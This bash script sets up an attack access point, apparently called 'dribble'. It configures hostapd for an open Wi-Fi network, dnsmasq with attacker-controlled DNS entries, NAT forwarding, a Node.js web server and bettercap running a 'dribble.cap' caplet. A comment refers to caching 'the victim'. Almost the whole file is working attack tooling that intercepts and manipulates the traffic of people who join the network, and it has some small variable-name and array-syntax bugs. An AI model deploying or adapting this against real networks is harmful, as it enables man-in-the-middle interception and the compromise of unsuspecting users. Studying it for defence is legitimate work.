#!/bin/bash

#        _      _ _     _     _      
#       | |    (_) |   | |   | |     
#     __| |_ __ _| |__ | |__ | | ___ 
#    / _` | '__| | '_ \| '_ \| |/ _ \
#   | (_| | |  | | |_) | |_) | |  __/
#    \__,_|_|  |_|_.__/|_.__/|_|\___|
#
# 	Author: Federico 'rhaidiz' De Meo                                    


# this needs root

if [ "$EUID" -ne 0 ]
	then echo "Run as root"
	exit
fi

# the internet interface
internet=eth0

# the wifi interface
phy=wlan0

# The ESSID
essid="TEST"

# the routers' IPs
routerips=["192.168.0.1/24"]

# configure network interfaces
ip addr add 10.0.0.1/24 dev $phy

# here add new IPs to phy so that I can cache the victim
# ip addr add 192.168.0.1/24 dev $phy
for i in "${routeips[@]}"
do
	:
	ip addr add $i dev $phy
done

# bring interface up
ip link set dev $phy up

##################
# DNSMASQ
##################
echo "
interface=wlan0

bind-interfaces

# Set default gateway
dhcp-option=3,10.0.0.1

# Set DNS servers to announce
dhcp-option=6,10.0.0.1

dhcp-range=10.0.0.2,10.0.0.10,12h

no-hosts
addn-hosts=$(pwd)/dnsentries.hosts

no-resolv
log-queries
log-facility=/var/log/dnsmasq.log

server=8.8.8.8
server=8.8.4.4

" > tmp-dnsmasq.conf

# start dnsmasq which provides DNS relaying service
dnsmasq --conf-file=tmp-dnsmasq.conf

##################
# IPTABLES
##################

# Enable Internet connection sharing
# configuring ip forwarding
echo '1' > /proc/sys/net/ipv4/ip_forward

# configuring NAT
iptables -A FORWARD -i $internet -o $phy -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i $phy -o $internet -j ACCEPT
iptables -t nat -A POSTROUTING -o $internet -j MASQUERADE

##################
# HOSTAPD
##################
echo "ctrl_interface=/var/run/hostapd

interface=$phy

# ESSID
ssid=$essid

driver=nl80211
auth_algs=3
channel=11
hw_mode=g

# all mac addresses allowed
macaddr_acl=0

# Filter allowed mac addresses
# macaddr_acl=1
# accept_mac_file=./accepted_mac

wmm_enabled=0" > tmp-hotspot.conf

echo "Start hostapd in screen hostapd"
screen -dmS hostapd hostapd tmp-hotspot.conf

##################
# NODE.JS
##################

# start the web server
echo "Start the HTTP server in screen httpnode"
screen -dmS nodehttp nodejs nodehttpserver.js

##################
# BETTERCAP
##################

# start bettercap"
# echo "Start bettercap in screen bettercap"
screen -dmS bettercap /home/pi/bin/bettercap/bettercap -caplet dribble.cap -iface $phy



# reset everything
echo "Hit enter to kill"
read
pkill dnsmasq
pkill hostapd
pkill bettercap
pkill nodejs
rm tmp-hotspot.conf
rm tmp-dnsmasq.conf
for i in "${routeips[@]}"
do
	:
	ip addr del $i dev $phy
done
ip addr del 10.0.0.1/24 dev $phy
iptables -t nat -F
iptables -t mangle -F
